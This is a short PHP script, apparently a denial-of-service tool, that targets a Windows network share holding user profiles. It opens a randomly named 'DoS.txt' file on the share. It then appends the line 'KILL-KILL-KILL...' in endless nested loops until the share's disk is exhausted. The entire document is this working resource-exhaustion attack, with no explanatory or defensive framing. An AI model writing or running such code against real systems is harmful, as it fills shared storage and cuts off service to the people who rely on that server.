<?php
$path = "\\\\winserver2003\\profily\\profilek";
$file = "DoS.txt".rand(1,999999);

while(1) {

$fp = fopen("$path\\$file", "a") or die("Cannot fopen!!!\n");
echo("fopen\n");
while(!feof($fp)) {
	fwrite($fp, "KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL-KILL\r\n");
}
fclose($fp);

}